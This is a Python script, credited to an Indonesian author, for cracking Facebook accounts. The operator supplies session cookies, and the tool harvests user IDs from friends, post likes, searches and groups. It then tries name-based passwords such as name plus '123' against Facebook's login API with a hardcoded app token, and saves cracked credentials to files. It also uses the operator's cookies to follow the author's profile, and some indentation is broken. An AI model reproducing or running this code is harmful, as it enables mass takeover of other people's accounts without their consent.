#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#Males gw encrypt Tod jika mau recode, recode aja
#Tapi ngotak dikit jangan Lo jual belikan sc ini kontol
#Code by Syafii-XD
#Created 05-07-2020
#My facebook (https://www.facebook.com/fikritampan305)

import os,sys,re,time,json,random,requests
from bs4 import BeautifulSoup as parser
from concurrent.futures import ThreadPoolExecutor

def yuk():
    os.system("git pull")
def clear():
    os.system("clear")
def pii(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1./300)
def legend():
    time.sleep(0.3)
    pii("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
     ██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
     ██║     ██████╔╝███████║██║     █████╔╝ 
\x1b[1;97m     ██║     ██╔══██╗╚════██║██║     ██╔═██╗ 
     ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Author   : Mhd Syafii
\x1b[1;97m [\x1b[1;92m•\x1b[1;94m•\x1b[1;97m] Github   : https://github.com/Syafii-XD
\x1b[1;97m [\x1b[1;94m•\x1b[1;92m•\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
\x1b[1;94m────────────────────────────────────────────────────""")

def daris():
    print("""\n\x1b[1;91m      ██████╗██████╗ ██╗  ██╗ ██████╗██╗  ██╗
     ██╔════╝██╔══██╗██║  ██║██╔════╝██║ ██╔╝
     ██║     ██████╔╝███████║██║     █████╔╝ 
\x1b[1;97m     ██║     ██╔══██╗╚════██║██║     ██╔═██╗ 
     ╚██████╗██║  ██║     ██║╚██████╗██║  ██╗
\x1b[1;91m  •\x1b[1;93m•\x1b[1;92m•\x1b[1;97m ╚═════╝╚═╝  ╚═╝     ╚═╝ ╚═════╝╚═╝  ╚═╝\x1b[1;92m •\x1b[1;93m•\x1b[1;91m•
\x1b[1;94m────────────────────────────────────────────────────
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Author   : Mhd Syafii
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Github   : https://github.com/Syafii-XD
\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] Facebook : https://www.facebook.com/fikritampan305
\x1b[1;94m────────────────────────────────────────────────────""")

def syafiixd():
    syafii=input("\n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
    if syafii == "": 
       os.system("python Cr4ck.py")
    else:
       sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
def syafiiganteng():
    time.sleep(0.1)
    print("\033[97m [\033[96m01\033[97m] Start  Cr4ck ID")
    print("\033[97m [\033[96m02\033[97m] Tutor  How to Get Fb Cookies")
    print("\033[97m [\033[96m03\033[97m] Joined Grup Fb ❤️ RATU ERROR ❤️")
    print("\033[97m [\033[96m04\033[97m] Joined Grup Fb Viral")
    print("\033[97m [\033[96m05\033[97m] Update Tools")
    print("\033[97m [\033[91m00\033[97m] Exit")
    print("\x1b[1;94m────────────────────────────────────────────────────")
    time.sleep(0.1)

    syafii=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
    if syafii == "1" or syafii =="01":
         mbasic = 'https://mbasic.facebook.com{}'
         global die,check,result, count
         id = []
         die = 0
         chek = []
         hack = []
         count = 0
         check = 0
         result = 0
         def masuk():
             try:
                    cek = open("cookies").read()
             except FileNotFoundError:
                   clear()
                   daris()
                   cek = input("\n\033[0;92m       [ \033[0;97mJangan Gunakan Akun Pribadi mu!!\033[0;92m]\n\n\033[97m [\033[91m?\033[97m] Cookies \033[1;91m: \033[1;96m")
                   print('\n\033[97m [\033[92m+\033[97m] \033[92mLoading.......')
             cek = {"cookie":cek}
             ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
             if "mbasic_logout_button" in str(ismi):
                     if "Apa yang Anda pikirkan sekarang" in str(ismi):
                             with open("cookies","w") as f:
                                     f.write(cek["cookie"])
                     else:
                           print("\033[1;97m[\033[1;94m•\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
                           try:
                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
                           except:
                                  pass
                     try:
                             ikuti = parser(requests.get(mbasic.format("/fikritampan305"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                             ses.get(mbasic.format(ikuti),cookies=cek)
                     except :
                             pass
                     return cek["cookie"];
                     pii('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
                     os.system("xdg-open https://www.facebook.com/fikritampan305")
             else:
                  os.system("xdg-open https://www.facebook.com/fikritampan305") 
                  os.system('rm -rf cookies')
                  print(" \n \x1b[1;97m[\x1b[1;91m!\x1b[1;97m] Cookies Error")
                  os.system('python Cr4ck.py')
         def login(username,password,cek=False):
             global die,check,result,count
             b = "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32"
             params = {
                     'access_token': b,
                     'format': 'JSON',
                     'sdk_version': '2',
                     'email': username,
                     'locale': 'en_US',
                     'password': password,
                     'sdk': 'ios',
                     'generate_session_cookies': '1',
                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
             }
             api = 'https://b-api.facebook.com/method/auth.login'
             response = requests.get(api, params=params)
             if 'EAA' in response.text:
                 print(f"\r\033[1;92m  * --> {username}|{password}                       ",end="")
                 print()
                 result += 1
                 if cek:
                        life.append(username+"|"+password)
                 else:
                        with open('ok.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             elif 'www.facebook.com' in response.json()['error_msg']:
                   print(f"\r\033[1;93m  * --> {username}|{password}                    ",end="")
                   print()
                   check += 1
                   if cek:
                           chek.append(username+"|"+password)
                   else:
                           with open('cp.txt','a') as f:
                                f.write(username + '|' + password + '\n')
             else:
                   die += 1
             for i in list('\|/-•'):
                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] ok : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
                            time.sleep(0.2)
         def getid(url):
             raw = requests.get(url,cookies=kuki).content
             getuser = re.findall('middle"><a class=".." href="(.*?)">(.*?)</a>',str(raw))
             for x in getuser:
                 if 'profile' in x[0]:
                        id.append(x[1] + '|' + re.findall("=(\d*)?",str(x[0]))[0])
                 elif 'friends' in x:
                        continue
                 else:
                        id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mSedang Mengambil ID... ",end="")
             if 'Lihat Teman Lain' in str(raw):
                 getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
             return id
         def fromlikes(url):
             try:
                  like = requests.get(url,cookies=kuki).content
                  love = re.findall('href="(/ufi.*?)"',str(like))[0]
                  aws = getlike(mbasic.format(love))
                  return aws
             except:
                  exit(" \033[1;97m [\033[1;94m•\033[1;97m] Link Not Found!")
         def getlike(react):
             like = requests.get(react,cookies=kuki).content
             ids  = re.findall('class="b."><a href="(.*?)">(.*?)</a></h3>',str(like))
             for user in ids:
                 if 'profile' in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0].split('/')[1])
                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID... ',end="")
             if 'Lihat Selengkapnya' in str(like):
                 getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
             return id
         def bysearch(option):
             search = requests.get(option,cookies=kuki).content
             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
             for user in users:
                  if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
                  else:
                         id.append(user[1] + "|" + user[0].split("?")[0])
                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID... ",end="")
             if "Lihat Hasil Selanjutnya" in str(search):
                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
             return id
         def grubid(endpoint):
             grab = requests.get(endpoint,cookies=kuki).content
             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
             for user in users:
                 if "profile" in user[0]:
                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
                 else:
                         id.append(user[1] + "|" + user[0])
                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mSedang Mengambil ID... ",end="")
             if "Lihat Selengkapnya" in str(grab):
                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
             return id
         if __name__ == '__main__':
               try:
                     pii('\033[1;97m[\033[1;94m√\033[1;97m] \033[1;92mLogin Successfully')
                   os.system("xdg-open https://www.facebook.com/fikritampan305")
                   ses = requests.Session()
                   kukis = masuk()
                   kuki = {'cookie':kukis}
                   clear()
                   legend()
                   pii('\033[1;97m [\033[1;94m☺☺\033[1;97m] Selamat Datang Bos Kuh')
                   pii('\033[1;97m [\033[1;92m01\033[1;97m] Crack From ID Friend')
                   pii('\033[1;97m [\033[1;92m02\033[1;97m] Crack From ID Link Posting')
                   pii('\033[1;97m [\033[1;92m03\033[1;97m] Crack From ID Search Name')
                   pii('\033[1;97m [\033[1;92m04\033[1;97m] Crack From ID Group ')
                   pii('\033[1;97m [\033[1;92m05\033[1;97m] Crack From ID Publick ')
                   pii('\033[1;97m [\033[1;92m06\033[1;97m] View Crack Results')
                   pii('\033[1;97m [\033[1;92m07\033[1;97m] Delete Cookies')
                   pii('\033[1;97m [\033[1;91m00\033[1;97m] Exit')
                   print('\x1b[1;94m────────────────────────────────────────────────────')
                   widiya = input('\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ')
                   if widiya =="":
                         print("\n\n\033[00m [\033[91m!\033[00m] Wrong Input!")
                         syafiixd()
                   elif widiya == '0' or widiya =='00':
                         pii("\n\033[1;92m Terima Kasih Sudah Menggunkan Tools Dari Saya.\n  Jangan Lupa Follow Akun Github Saya Ya..\n\n")
                         os.system('xdg-open https://github.com/Syafii-XD')
                         exit()                   	
                   elif widiya == '7' or widiya =='07':
                         print("\n\x1b[1;97m [\x1b[1;96m+\x1b[1;97m] \x1b[1;96mLoading... ")
                         pii("\x1b[1;92m • 10")
                         pii("\x1b[1;93m •• 20")
                         pii("\x1b[1;94m ••• 30")
                         pii("\x1b[1;95m •••• 40")
                         pii("\x1b[1;96m ••••• 50")
                         pii("\x1b[1;97m •••••• 60")
                         pii("\x1b[1;92m ••••••• 70")
                         pii("\x1b[1;91m •••••••• 80")
                         pii("\x1b[1;96m ••••••••• 90")
                         pii("\x1b[1;94m •••••••••• 100%")
                         os.system("rm -rf cookies")
                         print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
                         syafiixd()
                   elif widiya == '1' or widiya =='01':
                         url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                         username = getid(mbasic.format(url["href"]))
                   elif widiya == '2' or widiya =='02':
                         username = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Link Post \033[1;91m: \033[1;92m")
                         if username == "":
                                 exit("\033[00m[\033[91m!\033[00m] Cannot be empty!")
                         elif 'www.facebook' in username:
                                 username = username.replace('www.facebook','mbasic.facebook')
                         elif 'www.facebook' in username:
                                 username = username.replace('m.facebook','mbasic.facebook.com')
                         username = fromlikes(username)
                   elif widiya == '3' or widiya =='03':
                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] The Name You Want To Search For \033[1;91m: \033[1;92m")
                         username = bysearch(mbasic.format('/search/people/?q='+knf))
                         if len(username) == 0:
                                 exit("\033[90m[\033[91m!\033[90m] No Name!")
                   elif widiya == '4' or widiya =='04':
                         print("\033[1;97m\n [\033[1;94m•\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
                         grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                         username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
                         if len(username) == 0:
                                 exit("\033[00m[\033[91m!\033[00m] Group ID None!")
                   elif widiya == '5' or widiya =='05':
                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
                         if knf.isdigit():
                                 user = "/profile.php?id=" + knf
                         else:
                                 user = "/" + knf
                         try:
                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                 username = getid(mbasic.format(user))
                         except TypeError:
                                 exit("\033[00m[\033[91m!\033[00m] \033[97mUser/ID Wrong!")
                   elif widiya == '6' or widiya =='06':
                         try:
                                 file1 = open("cp.txt").read()
                                 file2 = open("ok.txt").read()
                                 a = file1 + file2
                                 final = a.strip().split("\n")
                                 final = set(final)
                                 print(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] Account To Check ")
                                 with ThreadPoolExecutor(max_workers=10) as ex:
                                         for user in final:
                                                 a = user.split("|")
                                                 ex.submit(login,(a[0]),(a[1]),(True))
                                 for x in result:
                                         with open('ok.txt','a') as f:
                                                 f.write(x+'\n')
                                 for x in chek:
                                         with open('cp.txt','a') as f:
                                                 f.write(x+"\n")

                                 print("\n\x1b[1;97m[\x1b[1;94m•\x1b[1;97m] Crack Done....")
                                 print("\x1b[1;97m[\x1b[1;94m✓\x1b[1;97m] Saved To \033[1;93mcp.txt\033[96m|\033[1;92mok.txt")
                         except FileNotFoundError:
                                 exit("\n\033[00m[\033[91m!\033[00m] You Didn't Get Results")
                   else:
                         print("\n\n \033[00m[\033[91m!\033[00m] Wrong Input!")
                         syafiixd()
                   print()
                   clear()
                   daris()
                   print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                   print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")       
                   expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                   expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
                   pii('\x1b[1;94m────────────────────────────────────────────────────\n')
                   clear()
                   daris()
                   print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                   print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
                   print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result\x1b[1;93m CP\x1b[1;97m saved to : cp.txt')
                   print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
                   with ThreadPoolExecutor(max_workers=30) as ex:
                          for user in username:
                                  users = user.split('|')
                                  ss = users[0].split(' ')
                                  for x in ss:
                                          listpass = [
                                                  str(x) + '123',
                                                  str(x) + '1234',
                                                  str(x) + '12345',
                                                  str(x) + '123456',
                                                  ]
                                          listpass.append(expass)
                                          for passw in set(listpass):
                                                  ex.submit(login,(users[1]),(passw))
                   if check != 0 or result != 0:
                           time.sleep(0.1)
                           print("\n\n\x1b[1;92m  *\x1b[1;97m finished.")
     
                   else:
                           print("\n\n\x1b[1;96m  *\x1b[1;97m you got no results:(")
               except (KeyboardInterrupt,EOFError):
                       exit()
               except requests.exceptions.ConnectionError:
                       exit("\n\n\033[00m  [\033[91m!\033[00m] no Connection")

    elif syafii == "2" or syafii =="02":
         os.system("xdg-open https://youtu.be/72zvkSbVPOI") 
         syafiixd()
    elif syafii == "3" or syafii =="03":
         os.system('xdg-open https://www.facebook.com/groups/1592269051080491')
         syafiixd()
    elif syafii == "4" or syafii =="04":
         os.system('xdg-open https://www.facebook.com/groups/3877586212335618')
         syafiixd
    elif syafii == "5" or syafii =="05":
         print("\n\n\x1b[1;97m      [ \x1b[1;92mPlease Wait While Updating The Tools \x1b[1;97m]\n")
         os.system("git pull")
         print("\n \x1b[1;97m[\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Successfully Updated!\n ")
         syafiixd()
    elif syafii == "0" or syafii =="00":
         pii("\n\033[1;92m Terima Kasih Sudah Menggunakan Tools Dari Saya.\n  Jangan Lupa Follow Akun Github Saya\n\n")
         os.system('xdg-open https://github.com/Syafii-XD')
         exit()                   	

if __name__=="__main__":
     clear()
     yuk()
     clear()
     legend()
     syafiiganteng()
     syafiixd()
